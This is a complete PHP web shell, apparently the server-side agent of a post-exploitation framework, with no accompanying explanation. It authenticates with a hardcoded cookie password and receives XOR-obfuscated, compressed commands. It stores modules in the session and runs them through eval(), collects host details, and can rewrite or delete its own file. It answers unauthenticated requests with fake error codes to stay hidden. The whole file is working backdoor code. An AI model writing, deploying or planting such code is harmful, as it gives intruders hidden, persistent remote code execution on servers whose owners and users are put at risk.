<?php

error_reporting(E_ALL);
ini_set('display_errors', 'on');

class Handler
{
    public  $REQUEST_METHOD                  = "POST";
    private $PASSWORD_TYPE                   = "COOKIE";
    private $PASSWORD_KEY                    = "X-Authorization";
    private $PASSWORD_VALUE                  = "P4ssw0rd!";
    private $REQUEST_DATA_TYPE               = "FIELD";
    private $REQUEST_DATA_KEY                = "data";
    private $RESPONSE_DATA_KEY               = "data";
    private $SESSION_NAME                    = "phpsessid";

    private $EX_CODE                         = "0";
    private $SUCC_CODE                       = "0";
    private $ERR_CODE                        = "1";
    private $FIELD_SEPARATOR                 = ",";
    private $VALUE_SEPARATOR                 = "=";
    private $CUSTOM_SEPARATOR                = "|";

    private $REQ_ACTION_KEY                  = "action";
    private $REQ_MSG_KEY                     = "data";

    private $REQ_MOD_ID_KEY                  = "id";
    private $REQ_MOD_NAME_KEY                = "name";
    private $REQ_MOD_CONTENT_KEY             = "content";
    private $REQ_MOD_ARGS_KEY                = "args";
    private $REQ_MOD_CWD_KEY                 = "cwd";

    private $MOD_ARGS_VAR                    = "#{ARGS}";
    private $MOD_CWD_VAR                     = "#{CWD}";

    private $RES_STATUS_KEY                  = "status";
    private $RES_MESSAGE_KEY                 = "message";

    public $ACTION_STATUS                    = "0";
    public $ACTION_INVOKE                    = "1";
    public $ACTION_LOAD                      = "2";
    public $ACTION_UNLOAD                    = "3";
    public $ACTION_CLEAN                     = "4";
    public $ACTION_UPDATE                    = "5";
    public $ACTION_DELETE                    = "6";

    private $MOD_RES_STATUS                  = "status";
    private $MOD_RES_MESSAGE                 = "message";

    private $ERR_INVALID_REQ_TYPE            = "invalid request type";
    private $ERR_INVALID_REQ_METHOD          = "invalid request method";
    private $ERR_NONEXISTENT_DATA            = "non-existent data";
    private $ERR_NONEXISTENT_ACTION          = "non-existent action";
    private $ERR_UNKNOWN_ACTION              = "unknown action code";
    private $ERR_EXCEPTION_FROM_MODULE       = "module throw an exception";
    private $ERR_NONEXISTENT_ACTION_DATA     = "non-existent action data";
    private $ERR_INVALID_ACTION_DATA         = "invalid action data";
    private $ERR_NONEXISTENT_MOD_ID          = "non-existent module id";
    private $ERR_NONEXISTENT_MOD_NAME        = "non-existent module name";
    private $ERR_NONEXISTENT_MOD_CONTENT     = "non-existent module content";
    private $ERR_NONEXISTENT_MOD_ARGS        = "non-existent module args";
    private $ERR_NONEXISTENT_MOD_CWD         = "non-existent module cwd";
    private $ERR_INVALID_MOD_ID              = "invalid module id";
    private $ERR_INVALID_MOD_NAME            = "invalid module name";
    private $ERR_INVALID_MOD_CONTENT         = "invalid module content";
    private $ERR_INVALID_MOD_ARGS            = "invalid module args";
    private $ERR_INVALID_MOD_CWD             = "invalid module cwd";

    private $ERR_INVALID_MODULE_RESP_DATA    = "invalid module response data";
    private $ERR_NONEXISTENT_MOD_STATUS      = "non-existent module response status";
    private $ERR_NONEXISTENT_MOD_DATA        = "non-existent module response data";
    private $ERR_INVALID_MODULE_RESP_CONTENT = "invalid module response content";

    protected $modules;

    public function __construct()
    {
        $this->modules = [];
        if (isset($_SESSION[$this->SESSION_NAME]) && ($_SESSION[$this->SESSION_NAME] !== ""))
            $this->str_to_modules($this->unprotect($_SESSION[$this->SESSION_NAME]));
    }

    private function get_field($type, $name)
    {
        switch ($type)
        {
            case "HEADER":
                $header_name = "HTTP_" . str_replace("-", "_", strtoupper($name));
                if (!isset($_SERVER[$header_name]))
                    return null;
                return $_SERVER[$header_name];
            case "COOKIE":
                if (!isset($_COOKIE[$name]))
                    return null;
                return $_COOKIE[$name];
            case "FIELD":
                switch ($this->REQUEST_METHOD)
                {
                    case "GET":
                        if (!isset($_GET[$name]))
                            return null;
                        return $_GET[$name];
                    case "POST":
                        if (!isset($_POST[$name]))
                            return null;
                        return $_POST[$name];
                    default:
                        throw new Exception($this->ERR_INVALID_REQ_METHOD, 1);
                }
            default:
                throw new Exception($this->ERR_INVALID_REQ_TYPE, 1);
        }
    }

    private function encrypt($data)
    {
        $data_len = @strlen($data);
        $password_len = @strlen($this->PASSWORD_VALUE);
        for ($i = 0; $i < $data_len; $i++)
            $data[$i] = $data[$i] ^ $this->PASSWORD_VALUE[$i % $password_len];
        return $data;
    }

    private function protect($data)
    {
        $compressed = gzencode($data, 7);
        $data_crypt = $this->encrypt($compressed);
        $data_hex_str = @bin2hex($data_crypt);
        return $data_hex_str;
    }

    private function unprotect($data)
    {
        $data_crypt = @hex2bin($data);
        if ($data_crypt === false)
            throw new Exception("unprotect(): first hex2bin() failed to '$data'", 1);
        $data_raw_hex = $this->encrypt($data_crypt);
        $uncompressed = gzdecode($data_raw_hex);
        return $uncompressed;
    }

    private function unpack_data($packed_request)
    {
        $fields = explode($this->FIELD_SEPARATOR, $packed_request);
        if (sizeof($fields) < 1)
            throw new Exception("unpack_data(): err explode() fields < 1 [" . @bin2hex($packed_request) . "]", 1);

        $data = array();
        foreach ($fields as $field)
        {
            $vals = explode($this->VALUE_SEPARATOR, $field);
            if (sizeof($vals) !== 2)
                throw new Exception("unpack_data(): err explode() values !== 2 [" . @bin2hex($packed_request) . "]", 1);

            $data[$vals[0]] = $vals[1];
        }
        return $data;
    }

    private function pack_value($key, $value, $end=false)
    {
        if ($end)
            return $key . $this->VALUE_SEPARATOR .$value;
        else
            return $key . $this->VALUE_SEPARATOR . @bin2hex($value);
    }

    private function generate_response($status, $message)
    {
        $response  = "";
        $response .= $this->RES_STATUS_KEY . $this->VALUE_SEPARATOR . $status . $this->FIELD_SEPARATOR;
        $response .= $this->RES_MESSAGE_KEY . $this->VALUE_SEPARATOR . @bin2hex($message);
        return $this->pack_value($this->RESPONSE_DATA_KEY, $this->protect($response), true);
    }

    private function modules_to_str($extend)
    {
        $modules = "";
        foreach ($this->modules as $module)
        {
            $mod  = "";
            $mod .= $module["id"] . $this->FIELD_SEPARATOR;
            $mod .= @bin2hex($module["name"]) . $this->FIELD_SEPARATOR;
            $mod .= $module["loaded"] . $this->FIELD_SEPARATOR;
            if ($extend)
                $mod .=  $module["data"] . $this->FIELD_SEPARATOR;
            $mod = rtrim($mod, $this->FIELD_SEPARATOR);
            $modules .= @bin2hex($mod) . $this->FIELD_SEPARATOR;
        }
        $modules = rtrim($modules, $this->FIELD_SEPARATOR);
        return $modules;
    }

    private function str_to_modules($str_modules)
    {
        if ($str_modules === "")
            return;
        $str_mods_hex = explode($this->FIELD_SEPARATOR, $str_modules);
        foreach ($str_mods_hex as $str_mod_hex)
        {
            $str_mod = @hex2bin($str_mod_hex);
            if ($str_mod === false)
                throw new Exception("err hex2bin() mod str_to_modules", 1);

            $str_mod_fields = explode($this->FIELD_SEPARATOR, $str_mod);
            if (sizeof($str_mod_fields) !== 4)
                throw new Exception("err invalid module fields in str_to_modules", 1);

            $str_mod_name = @hex2bin($str_mod_fields[1]);
            if ($str_mod_name === false)
                throw new Exception("err hex2bin() mod name in str_to_modules", 1);

            array_push($this->modules, [
                "id" => $str_mod_fields[0],
                "name" => $str_mod_name,
                "loaded" => $str_mod_fields[2],
                "data" => $str_mod_fields[3]
            ]);
        }
    }

    private function get_new_module_id()
    {
        while (true)
        {
            $module_id = rand();
            foreach ($this->modules as $module)
            {
                if ($module["id"] === $module_id)
                {
                    $module_id = -1;
                    break;
                }
            }
            if ($module_id > 0)
                break;
        }
        return $module_id;
    }

    private function find_module($module_field, $module_val)
    {
        $num_modules = sizeof($this->modules);
        while ($num_modules--)
            if ($this->modules[$num_modules][$module_field] === $module_val)
                return $num_modules;
        return -1;
    }

    private function refresh_modules()
    {
        $modules_session_str = $this->modules_to_str(true);
        $_SESSION[$this->SESSION_NAME] = $this->protect($modules_session_str);
    }

    private function load_module($module_name, $module_data)
    {
        $module_id = 0;
        $timestamp_now = strval(time());
        $module_index = $this->find_module("name", $module_name);

        if ($module_index !== -1)
        {
            $module_id = $this->modules[$module_index]["id"];
            $this->modules[$module_index]["data"] = $module_data;
            $this->modules[$module_index]["loaded"] = $timestamp_now;
        }
        else
        {
            $module_id = $this->get_new_module_id();
            array_push($this->modules, [
                "id" => $module_id,
                "name" => $module_name,
                "loaded" => $timestamp_now,
                "data" => $module_data
            ]);
        }
        $this->refresh_modules();
        $response  = "";
        $response .= "id" . $this->VALUE_SEPARATOR . $module_id . $this->FIELD_SEPARATOR;
        $response .= "loaded" . $this->VALUE_SEPARATOR . $timestamp_now . $this->FIELD_SEPARATOR;
        $response .= "memory" . $this->VALUE_SEPARATOR . strlen($_SESSION[$this->SESSION_NAME]);
        return $response;
    }

    private function replace_template_vars($content, $cwd, $args)
    {
        $content = str_replace($this->MOD_CWD_VAR, $cwd, $content);
        $content = str_replace($this->MOD_ARGS_VAR, $args, $content);
        return $content;
    }

    private function invoke_module($mod_content, $mod_cwd, $mod_args)
    {
        $mod_content_with_vars = $this->replace_template_vars(
            $mod_content,
            $mod_cwd,
            $mod_args
        );
        try
        {
            ob_start();
            eval($mod_content_with_vars);
            $mod_response_hex = ob_get_contents();
            ob_end_clean();

        }
        catch (ParseError $e)
        {
            throw new Exception("eval() parse error: " . $e->getMessage(), 1);
        }

        $mod_response = @hex2bin($mod_response_hex);
        if ($mod_response === false)
            throw new Exception($this->ERR_INVALID_MODULE_RESP_DATA . ": " . @bin2hex($mod_response_hex), 1);

        $mod_response_unpack = $this->unpack_data($mod_response);
        if (!array_key_exists($this->MOD_RES_STATUS, $mod_response_unpack))
            throw new Exception($this->ERR_NONEXISTENT_MOD_STATUS, 1);
        if (!array_key_exists($this->MOD_RES_MESSAGE, $mod_response_unpack))
            throw new Exception($this->ERR_NONEXISTENT_MOD_DATA, 1);

        $mod_status = $mod_response_unpack[$this->MOD_RES_STATUS];

        if (strpos($mod_response_unpack[$this->MOD_RES_MESSAGE], $this->CUSTOM_SEPARATOR) !== false)
            $mod_data = $mod_response_unpack[$this->MOD_RES_MESSAGE];
        else
            $mod_data = @hex2bin($mod_response_unpack[$this->MOD_RES_MESSAGE]);

        if ($mod_data === false)
            throw new Exception($this->ERR_INVALID_MODULE_RESP_CONTENT, 1);

        return $this->generate_response($mod_status, $mod_data);
    }

    private function remove_module($module_id, $module_index)
    {
        array_splice($this->modules, $module_index, 1);
        $this->refresh_modules();
        $response  = "";
        $response .= "id" . $this->VALUE_SEPARATOR . $module_id . $this->FIELD_SEPARATOR;
        $response .= "memory" . $this->VALUE_SEPARATOR . strlen($_SESSION[$this->SESSION_NAME]);
        return $response;
    }

    private function get_so()
    {
        $uname_val = explode(" ", php_uname());
        return $uname_val[0];
    }

        private function get_username()
    {
        $phpuname_fields = explode(" ", php_uname());
        if ($phpuname_fields[0] === "Windows")
            return @php_uname('n') . "\\" . getenv("username");

        $user_id = @posix_getuid();
        $user_info = @posix_getpwuid($user_id);
        return $user_info['name'];
    }

    private function do_status()
    {
        $response  = "";
        $response .= $this->pack_value("ex", $this->EX_CODE);
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("so", $this->get_so());
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("pwd", str_replace("\\", "/", getcwd()));
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("type", "php");
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("version", phpversion());
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("user", $this->get_username());
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("hostname", @php_uname('n'));
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->pack_value("modules", $this->modules_to_str(false));
        return $this->generate_response($this->SUCC_CODE, $response);
    }

    private function do_load($unpacked_request)
    {
        if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);

        $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
        if ($action_data === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);

        $action_data_unpack = $this->unpack_data($action_data);
        if (!array_key_exists($this->REQ_MOD_NAME_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_NAME);
        if (!array_key_exists($this->REQ_MOD_CONTENT_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_CONTENT);

        $mod_name = @hex2bin($action_data_unpack[$this->REQ_MOD_NAME_KEY]);
        if ($mod_name === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_NAME);
        $mod_content = @hex2bin($action_data_unpack[$this->REQ_MOD_CONTENT_KEY]);
        if ($mod_content === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_CONTENT);

        $response = $this->load_module($mod_name, $action_data_unpack[$this->REQ_MOD_CONTENT_KEY]);
        return $this->generate_response($this->SUCC_CODE, $response);
    }

    private function do_invoke($unpacked_request)
    {
        if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);

        $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
        if ($action_data === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);

        $action_data_unpack = $this->unpack_data($action_data);
        if (!array_key_exists($this->REQ_MOD_ID_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_ID);
        if (!array_key_exists($this->REQ_MOD_CWD_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_CWD);
        if (!array_key_exists($this->REQ_MOD_ARGS_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_ARGS);

        $mod_id = $action_data_unpack[$this->REQ_MOD_ID_KEY];
        if (is_numeric($mod_id) === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_ID);
        $mod_cwd = @hex2bin($action_data_unpack[$this->REQ_MOD_CWD_KEY]);
        if ($mod_cwd === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_CWD);
        $mod_args = @hex2bin($action_data_unpack[$this->REQ_MOD_ARGS_KEY]);
        if ($mod_args === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_ARGS);

        $module_index = $this->find_module("id", $mod_id);
        if ($module_index === -1)
            return $this->generate_response($this->ERR_CODE, "module id: '$mod_id' not found");

        return $this->invoke_module(
            @hex2bin($this->modules[$module_index]["data"]),
            $mod_cwd,
            $action_data_unpack[$this->REQ_MOD_ARGS_KEY]
        );
    }

    private function do_unload($unpacked_request)
    {
        if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);

        $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
        if ($action_data === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);

        $action_data_unpack = $this->unpack_data($action_data);
        if (!array_key_exists($this->REQ_MOD_ID_KEY, $action_data_unpack))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_MOD_ID);

        $mod_id = $action_data_unpack[$this->REQ_MOD_ID_KEY];
        if (is_numeric($mod_id) === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_MOD_ID);

        $module_index = $this->find_module("id", $mod_id);
        if ($module_index === -1)
            return $this->generate_response($this->ERR_CODE, "module id: '$mod_id' not found");

        $response = $this->remove_module($mod_id, $module_index);
        return $this->generate_response($this->SUCC_CODE, $response);
    }

    private function do_clean()
    {
        if (isset($_SESSION[$this->SESSION_NAME]))
        {
            unset($_SESSION[$this->SESSION_NAME]);
            $response = "memory" . $this->VALUE_SEPARATOR . "0";
            return $this->generate_response($this->SUCC_CODE, $response);
        }
        else
        {
            $response = "Session '" . $this->SESSION_NAME . "' not found";
            return $this->generate_response($this->ERR_CODE, $response);
        }
    }

    private function do_update($unpacked_request)
    {
        $response = "";
        
        if (!array_key_exists($this->REQ_MSG_KEY, $unpacked_request))
            return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION_DATA);

        $action_data = @hex2bin($unpacked_request[$this->REQ_MSG_KEY]);
        if ($action_data === false)
            return $this->generate_response($this->ERR_CODE, $this->ERR_INVALID_ACTION_DATA);
        
        if (is_writable(__FILE__) === false)
        {
            $response = "Can't self-update '" . __FILE__ . "' file is not writable";
            return $this->generate_response($this->ERR_CODE, $response);
        }

        $response = "Self-updated '" . __FILE__ . "' checksum '" . md5($action_data) . "'";
        $GLOBALS["control"] = [$this->ACTION_UPDATE, $action_data];
        return $this->generate_response($this->SUCC_CODE, $response);
    }

    private function do_delete()
    {
        $response = "Self-delete '" . __FILE__ . "' has been completed";
        if (is_writable(__FILE__) === false)
        {
            $response = "Can't self-delete '" . __FILE__ . "' file is not writable";
            return $this->generate_response($this->ERR_CODE, $response);
        }
        
        $GLOBALS["control"] = [$this->ACTION_DELETE, ""];
        return $this->generate_response($this->SUCC_CODE, $response);
    }

    public function handle()
    {
        try
        {
            $raw_request_data = $this->get_field($this->REQUEST_DATA_TYPE, $this->REQUEST_DATA_KEY);
            if ($raw_request_data === null)
                return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_DATA);

            $request_data = $this->unprotect($raw_request_data);
            $unpacked_request = $this->unpack_data($request_data);

            if (!array_key_exists($this->REQ_ACTION_KEY, $unpacked_request))
                return $this->generate_response($this->ERR_CODE, $this->ERR_NONEXISTENT_ACTION);

            switch ($unpacked_request[$this->REQ_ACTION_KEY])
            {
                case $this->ACTION_STATUS:
                    return $this->do_status();
                case $this->ACTION_LOAD:
                    return $this->do_load($unpacked_request);
                case $this->ACTION_INVOKE:
                    return $this->do_invoke($unpacked_request);
                case $this->ACTION_UNLOAD:
                    return $this->do_unload($unpacked_request);
                case $this->ACTION_CLEAN:
                    return $this->do_clean();
                case $this->ACTION_UPDATE:
                    return $this->do_update($unpacked_request);
                case $this->ACTION_DELETE:
                    return $this->do_delete();
                default:
                    return $this->generate_response($this->ERR_CODE, $this->ERR_UNKNOWN_ACTION);
            }
        }
        catch (Exception $e)
        {
            return $this->generate_response($this->ERR_CODE, $this->ERR_EXCEPTION_FROM_MODULE . PHP_EOL . $e);
        }
    }

    public function authenticate()
    {
        try
        {
            $request_password = $this->get_field($this->PASSWORD_TYPE, $this->PASSWORD_KEY);
            if ($request_password === null)
                return False;
            if ($request_password !== $this->PASSWORD_VALUE)
                return False;
        }
        catch (Exception $e)
        {
            return False;
        }
        return True;
    }
}

$response = "";

try
{
    session_start();

    $control = [];
    $handler = new Handler();
    if ($_SERVER['REQUEST_METHOD'] !== $handler->REQUEST_METHOD)
    {
        header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request', true, 400);
        exit();
    }

    if (!$handler->authenticate())
    {
        header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
        exit();
    }

    $response = $handler->handle();
    print($response);

    if (isset($control) && sizeof($control) === 2)
    {
        if ($control[0] === $handler->ACTION_UPDATE)
        {
            file_put_contents(__FILE__, $control[1]);
        }
        elseif ($control[0] === $handler->ACTION_DELETE)
        {
            unlink(__FILE__);
        }
    }
}
catch (Exception $e)
{
    var_dump($e);
    header($_SERVER['SERVER_PROTOCOL'] . ' 501 Not Implemented', true, 501);
    exit();
}
